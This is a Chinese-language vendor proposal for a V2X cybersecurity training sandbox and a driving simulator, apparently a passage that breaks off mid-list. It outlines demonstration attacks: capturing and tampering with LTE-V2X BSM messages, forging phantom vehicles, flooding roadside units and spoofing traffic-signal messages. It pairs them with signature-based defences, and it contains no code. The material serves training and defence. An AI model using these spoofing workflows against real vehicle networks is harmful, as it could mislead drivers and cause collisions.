title="智能驾驶网络靶场沙盘"></a>智能驾驶网络靶场沙盘</h1><h2 id="总体概述-2"><a href="#总体概述-2" class="headerlink" title="总体概述"></a>总体概述</h2><p>智能驾驶网络安全沙盘是基于V2X安全相关的场景进行设计的，该方案应用了优秀产品和技术，能够非常形象的展示V2X安全相关的一些场景，使用户能够充分的理解V2X安全相关内容。</p><p>V2X（Vehicle to X) 即“车对外界”的无线信息交换技术，是智能交通系统不可或缺的关键技术之一，同时也是无人驾驶的关键支撑技术。 V2X技术主要包括车-车通信（V2V）、车-路通信和车-周边设备通信（V2I）以及车-人之间的通信（V2P）三大类。</p><p>智能驾驶网络安全沙盘通过演示的方式介绍V2X技术的安全机制和原理，通过正向使用安全机制和方法，确保V2X设备间的互相通信是可信赖的，无法篡改的。</p><p>智能驾驶网络安全沙盘通过演示的方式介绍V2X技术的安全机制和原理，包括PKI/CA技术的授权证书管理，消息签名验证，假名证书变更策略、重放防御等，通过正向使用安全机制和方法，确保V2X设备间的互相通信是可信赖的，无法篡改的。</p><p>V2X信息安全防御子系统对LTE-V2X加入符合CCSA《基于LTE网络的车联网通信安全总体技术要求》报批稿要求的安全层协议，对LTE-V2X消息进行授权检查及完整性检查，抵御伪冒紧急车辆攻击，安全功能默认为关闭状态，在室内演示时可以通过PC进行开关控制，在室外实车演示时可以通过PAD进行开关控制。</p><p>智能驾驶网络安全沙盘是基于V2X安全相关的场景进行设计的，本方案应用了OBU、RSU、V2X技术、网络安全技术等技术和硬件产品，能够非常形象的展示V2V、V2I安全相关的一些测试场景，使用户能够充分的理解V2X安全相关内容，包括C-V2X 的 PC5 网络中采用通用的安全消息格式（SPDU）进行通信，在 V2V 通信场景中 SPDU 中携带假名证书（PC）或假名证书的摘要；在 V2I 场景中，车载终端收到的 SPDU 中携带 RSU 的应用证书（AC）或应用证书摘要等内容。</p><p>V2X（Vehicle to X) 即“车对任何事物”的无线信息交换技术，是智能交通系统不可或缺的重要技术之一，同时也是支撑无人驾驶的关键重要技术。V2X包括V2I（车与网络通信）、V2V（车与车通信）、V2P（车与人之间的通信）车与人之间的通信。通信参考国际标准化组织(ISO)制定的通信系统七层参考模型，及美国、欧洲正在制定的车用通信系统相关标准的系统架构，车用通信系统通常可以分为系统应用、应用层、传输层、网络层、数据链路层和物理层。V2X通信关注应用层及应用层与上下相邻两层的数据交互，通信接口使用PC5和Uu接口，信息交互实现道路安全、通行效率、信息服务等各类应用。支持车辆与其所能到达的区域范围内的道路基础设施之间，必须实现互联互通。提高驾驶安全性和交通效率。支持快速建立连接、网络稳定、实时性高等性能、节点间传输延迟低。支持主车与周边车辆、交通参与者的状态数据进行分析，计算出潜在的碰撞危险，提示驾驶员。</p><p>本方案支持V2X安全机制、原理等，包括基于PKI/CA技术的授权证书管理、消息签名验证、假名证书变更策略、重放防御等；</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cb732bf4b5b8695de8d1c38a2fbf2a63.png"></p><ul><li><strong>授权证书管理</strong>：如上图所示，安全认证证书采用平台管理模式，总的安全策略中存在根证书的节点，再由根证书逐级产生授权的子节点证书，最终发布给终端进行使用。</li><li><strong>消息签名验证</strong>：验证机制是使用加密证书和加密算法，在消息发送前对消息进行加密签名，确保消息无法被篡改。消息接收端在收到消息后，使用证书和加密算法对签名进行验证，如果签名是合法有效的，则认为本条消息的内容是可信的。</li><li><strong>假名证书变更策略</strong>：证书有的时候是使用匿名的方式，也称之为假名证书，与正常的证书使用方式相同，在使用了一段预设时间后，进行更换。</li><li><strong>重放防御</strong>：重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。</li></ul><p>本方案通过沙盘布景、自动行驶小车、动画演示V2X功能、真实V2X OBU设备等方式，模拟终端模块遭受攻击的场景，并搭建RSU遭受攻击的演示场景。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b6e4997b7bd43cfeb6c76931841fe2fd.png"></p><p>攻击场景设计如下：</p><ul><li><strong>前向碰撞预警（FCW）</strong></li></ul><p><strong>场景描述：</strong></p><ul><li>主车（HV）行驶，远车（RV）在HV同一车道正前方停止</li><li>HV正常行驶，RV-1位于HV同一车道的正前方停止。</li><li>HV和RV-1需具备V2X通信能力。</li><li>HV行驶过程中在即将于RV-1发生碰撞危险时，该场景预警功能对HV驾驶员发出预警，提醒驾驶员与位于正前方车RV-1存在碰撞危险。</li><li>预警时机需确保HV驾驶员收到预警后能及时避免与RV-1发生追尾碰撞。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/194aa6137cd7524de6b7a10df7bd878a."></p><p><strong>主车（HV）行驶，远车（RV）在同一车道停止</strong></p><p><strong>攻击方式：</strong>伪造V2X消息，发布假BSM消息，对道路车辆产生干扰</p><p><strong>防御方式：</strong>通过签名证书对接收到的消息进行延签，非法消息进行丢弃</p><ul><li>车辆失控预警</li></ul><p><strong>场景描述：</strong></p><ul><li>HV 和RV 同向行驶：</li><li>HV 和RV 均具备短程无线通信能力；</li><li>HV 和RV 同向行驶，HV 在RV 的后方；</li><li>RV 制动防抱死系统（ABS）、车身稳定性系统（ESP）、牵引力控制系统（TCS）、车道偏移预警系统（LDW）功能触发；</li><li>RV 广播车辆失控状态信息，HV 接收信息，CLW 应用对HV 驾驶员发出预警，提醒驾驶员注意；</li><li>预警时机需确保HV 驾驶员收到预警后，能有足够时间采取措施，避免与RV 发生碰撞。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f980b85fb04a66bc25d6400ec3894e67.png"></p><p><strong>HV和RV同向行驶</strong></p><p><strong>攻击方式：</strong>伪造V2X消息，发布假BSM消息，对道路车辆产生干扰</p><p><strong>防御方式：</strong>通过签名证书对接收到的消息进行延签，非法消息进行丢弃</p><ul><li><p><strong>闯红灯预警（RLVW）</strong></p><p><strong>场景描述：</strong></p></li></ul><p>V2X路侧设备支持MAP消息集广播，消息集对应十字路口拓扑结构，以及相应标识；同时MAP消息集提供车道停止线信息，以便车端判断闯红灯行为。同时，V2X路侧设备支持SPaT消息集广播，消息集内含有十字路口信号灯实时相位和状态。</p><p>场景设置：预警行为区分车道和车道对应信号状态采取不同的预警策略。每条车道根据当前不同的信号状态，必需反应真实的预警行为。例如，前方第一条车道是直行红灯，给出闯红灯预警，前方第二条车道是左转绿灯，不能显示闯红灯预警。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ae2c1cbc9bd4e703791829e527d4617d.png"></p><p><strong>闯红灯预警</strong></p><p><strong>攻击方式：</strong>伪造V2X消息，发布假BSM消息，对道路车辆产生干扰。详细系统逻辑架构设计见下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d2627dae4e57064d9277727d3e099e91.png"></p><ul><li><strong>小车1</strong>：包括预警App、OBU设备、自动驾驶小车载体。OBU中内置V2X软件，能够按照国标要求的标准收发V2X消息，并产生相应的预警功能，预警消息通过以太网方式发送给预警App。预警App安装在Pad上，通过以太网接收OBU发来的预警消息并在HMI屏幕上进行提示。</li><li><strong>小车2</strong>：包括预警App、OBU设备、安全验证软件模块、自动驾驶小车载体。OBU中内置V2X软件，能够按照国标要求的标准收发V2X消息，并产生相应的预警功能，预警消息通过以太网方式发送给预警App。预警App安装在Pad上，通过以太网接收OBU发来的预警消息并在HMI屏幕上进行提示。安全验证软件模块是运行在OBU中的一个加解密和证书签名验签的模块，通过这个模块可以对V2X消息进行签名，也可以对签名后的消息进行验证。</li><li><strong>攻击OBU：</strong>作为攻击端的一部分，用于监听V2X消息内容，并将篡改后的消息发布到其他OBU设备中。</li><li><strong>攻击PC：</strong>用于运行攻击软件，主要功能包括解析V2X消息、分析与编辑V2X消息，并将篡改后的消息送给攻击OBU进行发送。</li><li><strong>V2X RSU：</strong>作为V2X功能中的路程单元设备，参与V2X功能场景的实现。</li></ul><h2 id="智能驾驶网络安全沙盘"><a href="#智能驾驶网络安全沙盘" class="headerlink" title="智能驾驶网络安全沙盘"></a>智能驾驶网络安全沙盘</h2><h3 id="沙盘技术方案"><a href="#沙盘技术方案" class="headerlink" title="沙盘技术方案"></a>沙盘技术方案</h3><p>功能参数方案如下：</p><ol><li>沙盘的尺寸技术方案：沙盘尺寸等于3米*4米，2米*2米尺寸无法满足车辆多场景运行。可根据实际设计方案调整。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4a199f64848d5818f21041d21e33c57e.jpeg" alt="DSC_0014">同类智能驾驶沙盘示例</p><ol><li>主要静态场景技术方案：沙盘的主要场景有住宅、树木、草坪、路灯等装饰部分组成。装饰建筑由PVC板、亚克力板等组成。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1398f44c6fd7996a161dccd22f51c688.png" alt="微信截图_20230914203857"></p><ol><li>沙盘电源系统技术方案：可使用220VAC 50ZH市电输入，无需单独设置配电线路。内部配电5V 12V 24V等安全电压，总功率1200w。设置定时断电保护器。</li><li>沙盘的底座技术方案：沙盘制作做采用木质框架木板、钢化玻璃作为围挡，底盘平面采用实木白松板材制作龙骨框加上面平铺高密度板或高分子细木工板下方制作支撑点。底座总高度为700mm。底盘采用防火、阻燃、防蛀、耐变形的材料，选用的底板材料：防火板、高密度板和高分子有机复合板。整个台架为多个部分组成，方便拆分和搬运，外观使用烤漆处理。总质量2000KG。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ed36cb1d978a8d9a75c4020abc01b1d3.jpeg" alt="微信图片_20221014223705"></p><ol><li>固定交通标志技术方案：可以设置固定标志及可变标志（由屏幕组成），用于交通标志识别训练，识别到限速标志，进行速度切换，见到转弯或直径标志，根据标志进行相应的运动行为操作。并可以根据标志进行动作编程。可变标志联网并可控。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dff5fef20a6d00a5f0b18a57fa4dd29e.png" alt="微信截图_20230914203802"></p><ol><li>沙盘易损件技术方案：我司将在项目完结时，提供两年沙盘易损件，满足极限365天*88小时运行需求，随时有用的易损件。</li><li>沙盘服务器技术方案：沙盘服用器使用INTEL高性能主机，i5 8GRAM 256G固态+1TB 工控机。485控制板，串口控制器等电路，PLC系统。对外提供访问接口，对内连接各个模块和小车，用于同步数据和控制。第三方设备和开发者可以通过网络接口访问服务器，获得沙盘实时的状态和车辆信息，并且可以直接控制上述交互模块。</li><li>红绿灯控制功能技术方案：路口由多种形式的红绿灯组成，车辆行驶时，通过摄像头识别前方红绿灯包括人行道红绿灯，车道红绿灯，计时器等。红绿灯模块连接服务器，可以自动运行，也开放接口可以进行编程操作，用于实验智慧交通控制，根据车流量来自定义调整红绿灯时间。让小车顺利通过。</li><li>智慧灯光功能技术方案：沙盘路灯，建筑物装置灯等，均可以通过接口进行控制亮灭。并且沙盘上有多处灯光装饰的建筑物，可以自由定义演示颜色，明暗，闪动频率等，每处灯光都可单独控制，可根据场景需要分别亮起。显示丰富多彩的沙盘实景效果。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f0e4010e76270f357818eb9111b68e5e.png" alt="微信截图_20230914203920"></p><ol><li>数字化大屏显示功能技术方案：根据需要，数字化大屏显示功能能够实时展示沙盘的运行状态和关键数据。根据用户需求定制，大屏幕上可以显示各小车的位置、路径规划、交互状态等信息，为观察者提供直观的沙盘动态。</li><li>二次开发和三方通讯接口功能技术方案：沙盘上各个交互模块及相关数据均可以同步共享到服务器。可以通过接口，二次开发需要的功能，也可以连接第三方设备用于丰富沙盘功能。可根据第三方设备类型设置通讯接口。</li></ol><h3 id="小车性能参数技术方案"><a href="#小车性能参数技术方案" class="headerlink" title="小车性能参数技术方案"></a>小车性能参数技术方案</h3><p>小车是一款自动驾驶小车。本智能小车可以进行拆装。本小车通过搭载激光雷达和双目相机，我们将最前沿的深度学习、图像识别、SLAM 等技术应用到小车上。激光雷达小车 包括了所有传统 无人驾驶小车的功能，包括图像自动跟随、目标识别、SLAM 构图导航，激光雷达小车 可以通过 SLAM（同步定位和映射）算法来生成室内地图，在手机上可以预览到实时的地图并可通过在手机地图上点击地图上任意一点来控制 激光雷达小车 自动运行到目标地点。通过图像跟随技术，小车可以跟随任意一个目标运动。</p><ol><li>外形尺寸（外壳美观并带有XXXX标识产品模型）方案：长度18cm，宽度12cm，高度15cm(含支架及雷达高度)，多种驱动结构：</li><li>选用性能优于两区的4轮驱动方式，差速转向。2驱差速方式，可以原地转向阿克曼后驱双驱转向，和真实车辆一样4驱动全向，配专用电机及驱动器，可实现R=0转弯，速度可调。使用麦克纳姆轮，可以全向移动电机功率3W，电机编码器是磁编码器，AB双路输出。</li><li>重量：1.2kg。</li><li>数量：我方提供的演示车辆9辆。</li><li>传感器：包含一个单线激光雷达，8米测量半径，包含一个深度摄像头，普通摄像头，尝试摄像头可以输出1280*720深度图，包含一个双目摄像头，双目摄像头(须同时输出rgb图和深度图，像素1280*720，有效距离为0.6m-4m)，等于一个探头，我方交付时提供相关的输出处理的源代码及输出的结果的图片演示。相关的输出处理代码及结果如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5c2f0ee4706bf6706f63f5a884229fc8.png"></p><ol><li>驱动器：板载2-4路大功率电机驱动。最大驱动电流等于7A；最高支持24V电压输入。</li><li>电源：使用大容量动力锂离子电池自带12.6v，7800mAH锂电池，运行时间1.5小时，充电时间2.5小时，配套智能充电器。同时有对外放电能力。可以提供12V和5V的供电接口用来扩展其它设备。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d804075de79fd6033897c7c871aec15f.png" alt="微信截图_20230914201834"></p><ol><li>上位机支持ROS,预留接口为USB。同时，主板提供普通IO，PWM，</li></ol><p>I2C和SPI接口供上位软件直接调用。主板使用UBUNTU，系统流行，软件多，容易学习和开发。</p><ol><li>控制板功能及我司提供的设计原理图截图证明，功能模块绘制方式采用层次原理图，如下表。</li></ol><table><thead><tr><th>通讯串口引出。 独立9轴IMU模块，三轴陀螺仪，三轴加速度计，三轴磁力计。 电源转换，最大5V 5A输出。 USB接口。 烧写口，串口引出。 可扩展多路超声波，IIC，SPI接口。 无线遥控手柄接口，可接无线手柄。 短路保护，TVS防护，保险丝防护。 12 位高速 ADC 。 支持CAN通讯 。 支持 LCD 接口。</th></tr></thead><tbody><tr><td><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3e80526303c0369fa9c4b148be1ccce9.png" alt="微信截图_20230914202146"></td></tr><tr><td><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4a50aeb60723e9750e5347694c189b83.png" alt="微信截图_20230914202038"></td></tr><tr><td></td></tr></tbody></table><ol><li>自动行驶功能：在界面上选择目标点后，小车会自发出，到达目标点，然后根据脚本，选择执行任务或自动返航。行驶途中遇到突发情况，小车会根据脚本切换路线继续完成任务；</li><li>自动避障功能：小车在行驶过程中前方出现障碍物或其它小车时，使用超声波探测到后会自动在障碍前采取自动紧急刹车，绕道而行；</li><li>红绿灯识别功能：智能小车在行进中，通过摄像镜头识别前方红绿灯，根据红绿灯执行红灯停，绿灯行的操作，黄灯时会减速；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7ed8bf315aef633e235b0e127580c01a.png" alt="微信截图_20230914203816"></p><ol><li>自动跟车功能：前方有车辆时，会保持一定的速度跟着前方的小车，识别与前车距离过近自动停止。前车停后车停，前车走后车走。采用超声波测距加图像识别测距方法；</li><li>行人识别功能：人行道有行人时，车辆识别到行人时会主动停止，避免与行人发生碰撞。使用人工智能和视觉处理自动识别出行人并框出。识别采用图像识别+深度学习等方式；</li><li>低电量功能：小车电量较低时，可以通过降速主动进行自动连接充电桩并进入充电模式。而且但电量不满足出发条件时，会拒绝上位机发来的出发任务。需要提供多辆演示车辆来满足整体运行不停摆；</li><li>自主定位功能：在行车道下面预埋定位器，使用激光雷达和地图和AMCL算法，算出自己位置，并上报给服务器。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/99266cfe782f0e00a2e1267f78667b71.png"></p><p>雷达dingwec</p><ol><li>前方车辆车距保持功能：小车识别前方车辆模型，前方车辆可以遥控或自动行驶。识别与前车距离，距离过近时后车主动降速跟随，如果前车停止行驶后车自动停止。采用超声波测距，图像识别测距等多模测距方法；</li><li>数据交互功能：沙盘上所有小车的数据都会使用无线WIFI传给服务器，并由服务器发送给其它软件进行处理，用于数字孪生，大屏展示等。同时可以用触屏发出数据指令到服务器，服务器在传给小车，达到双向数据交互功能。</li><li>中控管理软件：可以将数据实时显示在大屏上，包括车辆第一视角，实时将小车看到的场景投屏到指定的一屏幕上。屏幕上可以实时显示小车所看到的影像及二值化处理的两个视频图像，车辆位置，电量及状态等，显示内容可以定义；</li><li>小车系统完全开源，支持标准C语言，C++以及Python编程，提供机器人基本算法源代码。</li></ol><h3 id="智能驾驶网络安全场景"><a href="#智能驾驶网络安全场景" class="headerlink" title="智能驾驶网络安全场景"></a>智能驾驶网络安全场景</h3><p>本方案支持攻击演示场景包括：伪冒车辆权限攻击、篡改V2X消息进行虚构车辆攻击、假冒道路流动车辆数据攻击、车路通信干扰等场景。</p><p>本方案支持各种攻击场景，其中主要攻击演示场景包括：</p><ul><li>伪冒车辆权限攻击</li><li>篡改V2X消息进行虚构车辆攻击</li><li>假冒道路流动车辆数据攻击</li><li>车路通信干扰</li></ul><h4 id="伪冒车辆权限攻击场景方案"><a href="#伪冒车辆权限攻击场景方案" class="headerlink" title="伪冒车辆权限攻击场景方案"></a>伪冒车辆权限攻击场景方案</h4><ol><li>本方案支持数据捕获配置工具完成初始化配置，对OBU（攻击）捕获到的LTE-V2X消息发送的目的ip及端口进行配置，数据捕获配置OBU中持久化保存，捕获功能默认开启；</li></ol><p>本方案配有数据捕获配置模块，该模块的功能是支持配置数据捕获工具配置ip和端口号，用户在捕获数据前可用捕获配置工具进行初始化配置，配置成被攻击OBU的ip及端口，用OBU（攻击）捕获到发送到目的ip及端口的LTE-V2X消息，支持数据捕获配置OBU中数据信息进行持久化保存，配置完成后默认捕获功能开启。下图有数据捕获时序图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d74ad96db1acc92e0698440720eef180.png"></p><ol><li>本方案支持OBU（攻击）捕获到LTE-V2X网络消息后根据数据捕获工具的配置信息发给PC，Wireshark通过网卡抓包将LTE-V2X可视化的展示出来，并保存为pcap文件；</li></ol><p>本方案支持查看捕获到数据、保存捕获数据等功能，用户可以用数据捕获工具使OBU（攻击）捕获LTE-V2X网络消息，并把捕获的消息根据数据捕获工具的配置信息发给相应的PC，Wireshark通过网卡抓包，把抓到的数据包进行解析，数据捕获分析工具支持可视化的展示，下图是Wireshark抓包界面，并且支持数据包多种保存格式，其中保存pcap格式文件为主。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6776c4dc9f319c57b5f1c06bdee19de7.png"></p><ol><li>本方案支持攻击辅助工具将pcap文件中的每个数据包中的紧急车辆字段篡改为紧急车辆标书数值，再通过WiFi网络发给OBU（攻击），最后OBU（攻击）再将篡改后的LTE-V2X消息广播到PC5网络中。</li></ol><p>本方案支持对捕获的数据进行篡改功能，用户可以用这个功能把捕获的BMS消息进行篡改，如把失控车辆字段篡改为失控车辆数字，支持数据捕获编辑模块保存篡改的数据，如保存成pcap文件等，通过有线网络或无线网络把pcap文件发给OBU（攻击），最后OBU（攻击）再用V2X接口把篡改后的LTE-V2X消息广播到PC5网络中。下图有上述功能时序图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d74ad96db1acc92e0698440720eef180.png"></p><h4 id="虚构车辆攻击场景方案"><a href="#虚构车辆攻击场景方案" class="headerlink" title="虚构车辆攻击场景方案"></a>虚构车辆攻击场景方案</h4><ol><li>本方案支持配置工具开启OBU（攻击）的位置模拟开关，OBU（攻击）可以将记录的车辆历史轨迹信息加到LTE-V2X消息中进行发送；</li></ol><p>本方案配有位置信息模拟模块，支持配置工具模拟位置信息功能，用户通过记录道路中车辆位置信息，保存道路信息记录，添加其他车辆数据信息，生成相应的BSM消息，把模拟生成BSM消息通过OBU（攻击）发送到V2X网络中。下图是车辆的OBU发送BSM消息模拟图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ad417d1511831ca29e12b86a0f3bcc91.png"></p><ol><li>本方案支持主车在收到伪冒的BSM消息后，HMI显示出周边有车辆存在，对驾驶员产生误导。</li></ol><p>本方案有模拟位置信息功能，用户可以用模拟位置信息功能发送模拟位置信息，主车在V2X网络收到伪冒的BSM消息，车机显示屏显示出周边有车辆存在信息，并产生相应预警信息，对驾驶员产生误导，影响车辆驾驶员正常驾驶车辆。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ad417d1511831ca29e12b86a0f3bcc91.png"></p><h4 id="假冒道路流动车辆数据攻击场景方案"><a href="#假冒道路流动车辆数据攻击场景方案" class="headerlink" title="假冒道路流动车辆数据攻击场景方案"></a>假冒道路流动车辆数据攻击场景方案</h4><ol><li>本方案支持发布虚拟的BSM消息伪造道路上的流动车辆，导致RSU上传错误的车辆信息和数据；</li></ol><p>本方案支持大规模模拟车辆数据信息功能，用户可以用这个功能，模拟大规模车辆信息，每个被模拟的虚拟车辆会生成实时BSM消息，通过V2X网络发布这些虚拟车辆的BSM消息，伪造道路上的车辆信息，照成道路拥堵假象，导致RSU上传错误的车辆信息和数据。</p><ol><li>本方案支持通过模拟大量的BSM消息并高频次的发送，对RSU进行拥塞式的攻击。</li></ol><p>本方案支持大规模模拟车辆数据信息功能，用户可以用这个功能，模拟大规模车辆信息，每个被模拟的虚拟车辆会生成实时BSM消息，通过V2X网络发布这些虚拟车辆的BSM消息，伪造道路上的车辆信息，并且支持高频次的发送虚拟车辆的BSM消息功能，对RSU进行拥塞式的攻击。</p><h4 id="伪冒RSU消息攻击"><a href="#伪冒RSU消息攻击" class="headerlink" title="伪冒RSU消息攻击"></a>伪冒RSU消息攻击</h4><ol><li>本方案支持配置工具截取真实RSU发出的V2X消息，包括SPAT、MAP、RSI、RSM消息；</li></ol><p>本方案支持截取V2X数据功能，支持截取SPAT、MAP、RSI、RSM等RSU发出的V2X消息，V2X用PC5和Uu接口通信，PC5接口是车的模组和 车、路侧设备、人交互的接口。使用V2X业务UE之间用户面进行D2D（Device to Device）直接通信的接口。Uu接口：是车辆和基站的空口通信，uu口遵循3gpp LTE/5G 的协议。用V2X数据截取功能在PC5和Uu接口截取真实RSU发出的V2X消息，包括SPAT、MAP、RSI、RSM消息。</p><ol><li>本方案支持攻击工具对截获的V2X消息进行可视化展示，并进行可视化编辑，构建伪冒消息；包括篡改信号灯信息、篡改地图信息等；</li></ol><p>本方案支持篡改V2X数据功能，用户可以在V2X网络截取的V2X消息，并用可视化工具显示截取的V2X消息，支持把截取的V2X消息解析不同的数据格式，包括Lua、json等数据格式，支持可视化编辑截取的V2X消息，达到篡改和伪冒V2X数据的目的，支持篡改信号灯信息、篡改地图信息等。</p><ol><li>本方案支持通过篡改V2X消息，发布虚假的信号灯信息、道路预警信息等给驾驶员产生干扰；</li></ol><p>本方案提供V2X编辑和V2X通信功能，用户可以在V2X网络截取的V2X消息，并用可视化工具显示截取的V2X消息，支持把截取的V2X消息解析不同的数据格式，包括Lua、json等数据格式，支持可视化编辑截取的V2X消息，达到篡改和伪冒V2X数据的目的，把篡改和伪冒V2X数据的发布到V2X网络中，支持发送虚假的信号灯信息、道路预警信息等，影响驾驶员正常驾驶，给驾驶员驾驶车辆产生干扰。</p><h1 id="网络靶场动态仿真系统"><a href="#网络靶场动态仿真系统" class="headerlink" title="网络靶场动态仿真系统"></a>网络靶场动态仿真系统</h1><h2 id="总体概述-3"><a href="#总体概述-3" class="headerlink" title="总体概述"></a>总体概述</h2><p>提供智能驾驶虚拟仿真，系统结合人车路环境实时仿真系统，同步采集驾驶模拟器数据、驾驶模拟环境数，具备多种智能驾驶场景，能够与靶场演示场景联动。</p><p>黑客入侵车辆体验驾驶模拟器为了最大限度地提高被黑客入侵时的状况效果,将开发满足要求的模拟器系统。 模拟器以利用3个以上显示器的影像装置和适用实际车辆配件的包括车辆驾驶席及操作装置的机舱、类似再现车辆行动的运动平台为中心构成。 模拟软件将开发出忠实于体验黑客情况的剧本,并构建适合的虚拟道路。</p><p>我司提供自主研发的汽车模拟座舱是本系统的关键设备之一，项目驾驶舱车 车型为模拟小轿车驾驶舱制造，座舱为全功能模拟座舱，操作感与实车的相似性是本项目的关键所在，具有噪声小、无污染、能耗低和便于安装、维修方便等优点，设计模拟真车的各操纵机件及驾驶座舱位置，符合国内的驾驶习惯；整台驾 驶舱有：动感平台、舱体、转向盘、踏板、档位、电控系统、伺服驱动系统等操纵机件及座椅等组成，舱体外壳环保且防火。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a9801362cef4f77a2e0751dc771bafac.png"></p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>智能驾驶网络安全动态仿真系统是为了提供安全、舒适和智能化的驾驶体验而设计的。它可以帮助发现和修复漏洞，验证安全改进，提供安全培训和教育，支持决策制定，保障车辆和乘客的安全。通过利用该系统，智能驾驶系统可以更好地应对网络安全挑战，提高整体的安全性和可靠性。智能驾驶网络安全动态仿真系统具有以下应用价值：</p><ul><li>安全评估和漏洞发现：智能驾驶网络安全动态仿真系统可以模拟真实的网络环境，对智能驾驶系统进行全面的安全评估和漏洞发现。通过模拟各种攻击场景和网络威胁，系统可以检测和识别潜在的漏洞和安全风险，帮助开发者和厂商及时修复和加固系统，提高智能驾驶系统的安全性。</li><li>漏洞修复和改进验证：智能驾驶网络安全动态仿真系统可以模拟和复现已知的漏洞和攻击，帮助开发者验证修复措施的有效性和系统的改进。通过不断的漏洞修复和改进验证，系统可以逐步提升智能驾驶系统的安全性和抗攻击能力，降低潜在的安全风险。</li><li>安全培训和教育：智能驾驶网络安全动态仿真系统可以作为安全培训和教育的工具，帮助开发者、工程师和驾驶员了解和掌握智能驾驶系统的网络安全知识和技术。通过模拟真实的攻击场景和网络威胁，系统可以提供实践性的培训和教育，提高人员的安全意识和应对能力，从而减少人为因素对智能驾驶系统安全的影响。</li><li>策略制定和决策支持：智能驾驶网络安全动态仿真系统可以帮助决策者和管理者制定安全策略和决策，并提供决策支持。通过模拟不同的安全威胁和攻击场景，系统可以评估不同策略和决策的风险和影响，帮助决策者做出明智的决策，保护智能驾驶系统的安全和可靠性。</li><li>车辆和乘客安全保障：智能驾驶网络安全动态仿真系统可以有效保障车辆和乘客的安全。通过不断的安全评估和漏洞发现，系统可以及时发现和修复潜在的安全隐患，提高车辆的防护能力和安全性能。这将有助于减少事故和故障的发生，保护乘客的生命和财产安全。</li></ul><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><p>智能驾驶网络安全动态仿真系统由以下模块组成：</p><p>1. 反力装置：</p><p>功能参数如下：智能驾驶座舱配备了反力装置，用于模拟车辆行驶时的加速、制动和转向等力反馈。</p><p>功能参数如下：反力装置能够根据车辆的动态状态和驾驶操作提供逼真的力反馈，增强驾驶者的感知和控制能力。</p><p>2. 动力学模型：</p><p>功能参数如下：智能驾驶座舱内置了车辆的动力学模型，能够准确模拟车辆在不同驾驶条件下的行驶特性。</p><p>功能参数如下：动力学模型可以实时计算车辆的速度、加速度、转速等参数，并将其用于反力装置的控制和驾驶信息的显示。</p><p>3. 影像系统：</p><p>功能参数如下：智能驾驶座舱配备了高清晰度的影像系统，用于显示车辆周围的实时影像。</p><p>功能参数如下：影像系统可以通过车载摄像头获取车辆周围的图像，并将其显示在仪表盘或中央显示屏上，帮助驾驶者更好地了解周围环境。</p><p>4. 仪表盘：</p><p>功能参数如下：智能驾驶座舱的仪表盘提供了多个显示模块，包括速度、转速、温度/警告、发动机/电池故障、驾驶信息和AVN（音频、视频、导航）信息等。</p><p>功能参数如下：驾驶者可以通过仪表盘清晰地查看车辆的关键信息，以便实时监控车辆的状态和驾驶情况。</p><p>5. 操作台：</p><p>功能参数如下：智能驾驶座舱配备了人机交互的操作台，包括按钮、旋钮、触摸屏等控制设备。</p><p>功能参数如下：驾驶者可以通过操作台进行车辆的各项操作，如调节座椅、控制空调、切换驾驶模式等，以满足个性化的需求和偏好。</p><p>6. 